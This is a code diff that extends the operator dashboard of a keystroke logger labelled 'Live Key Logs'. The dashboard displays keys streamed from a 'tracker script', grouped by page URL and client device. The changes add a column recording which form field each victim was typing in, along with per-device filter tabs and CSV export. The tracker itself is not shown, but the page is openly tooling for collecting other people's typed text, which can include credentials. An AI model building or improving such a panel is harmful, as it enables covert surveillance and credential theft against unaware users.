@@ -52,8 +52,8 @@
     }
     header {
       display: flex;
-      align-items: center;
-      justify-content: space-between;
+      flex-direction: column;
+      gap: 10px;
       padding: 14px 20px;
       border-bottom: 1px solid var(--border);
       background: rgba(5, 7, 11, 0.95);
@@ -61,6 +61,12 @@
       position: sticky;
       top: 0;
       z-index: 10;
+    }
+    .header-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
     }
     .status {
       display: flex;
@@ -139,6 +145,29 @@
       color: var(--text-muted);
       white-space: nowrap;
     }
+    .client-tabs {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 2px;
+    }
+    .client-tab {
+      padding: 4px 10px;
+      border-radius: 999px;
+      border: 1px solid var(--border);
+      background: #020409;
+      color: var(--text-muted);
+      font-size: 11px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .client-tab.active {
+      border-color: var(--accent);
+      background: #0b3b23;
+      color: #ecfdf5;
+    }
+
     main {
       padding: 14px 20px 30px;
     }
@@ -151,7 +180,7 @@
     thead {
       background: rgba(5,7,11,0.98);
       position: sticky;
-      top: 56px;
+      top: 90px;
       z-index: 5;
     }
     th,
@@ -178,12 +207,12 @@
       background: #050814;
     }
     .col-id {
-      width: 50px;
+      width: 40px;
       color: var(--text-muted);
       font-size: 11px;
     }
     .col-time {
-      width: 160px;
+      width: 150px;
       font-size: 11px;
       color: #e5e7eb;
     }
@@ -191,6 +220,11 @@
       width: 120px;
       font-size: 11px;
       color: #cbd5f5;
+    }
+    .col-field {
+      width: 200px;
+      font-size: 11px;
+      color: #9ca3af;
     }
     .col-url a {
       color: var(--accent);
@@ -205,24 +239,6 @@
       white-space: pre-wrap;
       word-break: break-word;
       font-size: 12px;
-    }
-    .pill {
-      display: inline-block;
-      padding: 2px 6px;
-      margin: 1px 2px 1px 0;
-      border-radius: 999px;
-      background: var(--pill-bg);
-      border: 1px solid var(--pill-border);
-    }
-    .pill-special {
-      background: var(--pill-special-bg);
-      border-color: var(--pill-special-border);
-      color: #fdf2ff;
-    }
-    .pill-space {
-      background: var(--pill-space-bg);
-      border-color: var(--pill-space-border);
-      color: #d1fae5;
     }
     .no-logs {
       text-align: center;
@@ -254,26 +270,31 @@
 </head>
 <body>
   <header>
-    <div class="status">
-      <div class="dot"></div>
-      <div>
-        <h1>Live Key Logs</h1>
-        <div class="subtitle">
-          realtime activity from your tracker script &mdash; newest on top
+    <div class="header-top">
+      <div class="status">
+        <div class="dot"></div>
+        <div>
+          <h1>Live Key Logs</h1>
+          <div class="subtitle">
+            realtime activity from your tracker script &mdash; newest on top
+          </div>
         </div>
       </div>
+      <div class="controls">
+        <input
+          id="filterInput"
+          type="text"
+          placeholder="Filter by URL, keys or client..."
+        />
+        <button id="groupToggle" class="btn">Group by URL: ON</button>
+        <button id="themeToggle" class="btn">Theme: Dark</button>
+        <button id="downloadBtn" class="btn">Download CSV</button>
+        <button id="clearBtn" class="btn">Clear</button>
+        <span class="badge" id="countBadge">0 entries</span>
+      </div>
     </div>
-    <div class="controls">
-      <input
-        id="filterInput"
-        type="text"
-        placeholder="Filter by URL, keys or client..."
-      />
-      <button id="groupToggle" class="btn">Group by URL: ON</button>
-      <button id="themeToggle" class="btn">Theme: Dark</button>
-      <button id="downloadBtn" class="btn">Download CSV</button>
-      <button id="clearBtn" class="btn">Clear</button>
-      <span class="badge" id="countBadge">0 entries</span>
+    <div class="client-tabs" id="clientTabs">
+      <!-- dynamic: All / PC / Laptop etc -->
     </div>
   </header>
 
@@ -284,13 +305,14 @@
           <th class="col-id">#</th>
           <th class="col-time">Time</th>
           <th class="col-client">Client</th>
+          <th class="col-field">Field</th>
           <th class="col-url">Page URL</th>
           <th class="col-keys">Text</th>
         </tr>
       </thead>
       <tbody id="logBody">
         <tr>
-          <td colspan="5" class="no-logs">Waiting for logs...</td>
+          <td colspan="6" class="no-logs">Waiting for logs...</td>
         </tr>
       </tbody>
     </table>
@@ -298,6 +320,7 @@
     <div class="footer-note">
       • Logs are kept in memory (latest 1000 entries).<br />
       • "Group by URL" shows one row per page <strong>and per client</strong>, combining all keys for that page/device.<br />
+      • "Field" shows where you were typing (tag, type, name, id, placeholder).<br />
       • Download CSV exports all logs currently in memory.
       <div class="centrali">MadeByCentrali</div>
     </div>
@@ -309,6 +332,7 @@
     let nextId = 1;
     let filterText = "";
     let groupedMode = true; // default ON
+    let activeClientFilter = "ALL";
     const MAX_LOGS = 1000;
 
     // ---------- DOM ----------
@@ -319,6 +343,7 @@
     const themeToggle = document.getElementById("themeToggle");
     const downloadBtn = document.getElementById("downloadBtn");
     const clearBtn = document.getElementById("clearBtn");
+    const clientTabs = document.getElementById("clientTabs");
 
     // ---------- THEME ----------
     function applyTheme(theme) {
@@ -339,6 +364,7 @@
     function normalizeLog(data) {
       const url = data.url || "N/A";
       const client = data.client || "unknown";
+      const field = data.field || "unknown";
       const keysArr = Array.isArray(data.keys)
         ? data.keys.map(k => String(k))
         : [String(data.keys ?? "")];
@@ -351,6 +377,7 @@
         id: nextId++,
         url,
         client,
+        field,
         keys: keysArr,
         timestamps: tsArr,
         time: primaryTs
@@ -369,13 +396,40 @@
     }
 
     function matchesFilter(log) {
+      if (activeClientFilter !== "ALL" && log.client !== activeClientFilter) {
+        return false;
+      }
+
       if (!filterText) return true;
       const f = filterText.toLowerCase();
       return (
         (log.url && log.url.toLowerCase().includes(f)) ||
         (log.client && log.client.toLowerCase().includes(f)) ||
+        (log.field && log.field.toLowerCase().includes(f)) ||
         log.keys.join(" ").toLowerCase().includes(f)
       );
+    }
+
+    function rebuildClientTabs() {
+      const clients = new Set(logs.map(l => l.client || "unknown"));
+      clientTabs.innerHTML = "";
+
+      const makeTab = (label, value) => {
+        const btn = document.createElement("button");
+        btn.className = "client-tab" + (value === activeClientFilter ? " active" : "");
+        btn.textContent = label;
+        btn.addEventListener("click", () => {
+          activeClientFilter = value;
+          rebuildClientTabs();
+          render();
+        });
+        return btn;
+      };
+
+      clientTabs.appendChild(makeTab("ALL", "ALL"));
+      Array.from(clients).sort().forEach(c => {
+        clientTabs.appendChild(makeTab(c, c));
+      });
     }
 
     // ---------- RENDER ----------
@@ -390,7 +444,7 @@
       if (filtered.length === 0) {
         const row = document.createElement("tr");
         const cell = document.createElement("td");
-        cell.colSpan = 5;
+        cell.colSpan = 6;
         cell.className = "no-logs";
         cell.textContent = "No logs to display yet.";
         row.appendChild(cell);
@@ -417,6 +471,11 @@
           tdClient.className = "col-client";
           tdClient.textContent = log.client;
           tr.appendChild(tdClient);
+
+          const tdField = document.createElement("td");
+          tdField.className = "col-field";
+          tdField.textContent = log.field;
+          tr.appendChild(tdField);
 
           const tdUrl = document.createElement("td");
           tdUrl.className = "col-url";
@@ -458,7 +517,7 @@
           const latest = groupLogs[0];       // newest batch
           const total = groupLogs.length;
 
-          // ✅ combine all keys from all logs for this URL+client, oldest → newest
+          // combine all keys oldest → newest
           const combinedKeys = [];
           for (let i = groupLogs.length - 1; i >= 0; i--) {
             combinedKeys.push(...groupLogs[i].keys);
@@ -486,6 +545,11 @@
           tdClient.className = "col-client";
           tdClient.textContent = client;
           tr.appendChild(tdClient);
+
+          const tdField = document.createElement("td");
+          tdField.className = "col-field";
+          tdField.textContent = latest.field || "unknown";
+          tr.appendChild(tdField);
 
           const tdUrl = document.createElement("td");
           tdUrl.className = "col-url";
@@ -527,12 +591,13 @@
 
     downloadBtn.addEventListener("click", () => {
       if (!logs.length) return;
-      const rows = [["id", "time", "client", "url", "keys", "timestamps"]];
+      const rows = [["id", "time", "client", "field", "url", "keys", "timestamps"]];
       logs.forEach(log => {
         rows.push([
           log.id,
           log.time,
           log.client || "",
+          log.field || "",
           log.url,
           log.keys.join(" "),
           (log.timestamps || []).join(" | ")
@@ -578,6 +643,7 @@
         if (logs.length > MAX_LOGS) {
           logs = logs.slice(0, MAX_LOGS);
         }
+        rebuildClientTabs();
         render();
       } catch (e) {
         console.error("Failed to parse event data", e);
@@ -589,6 +655,7 @@
     };
 
     // initial render
+    rebuildClientTabs();
     render();
   </script>
 </body>
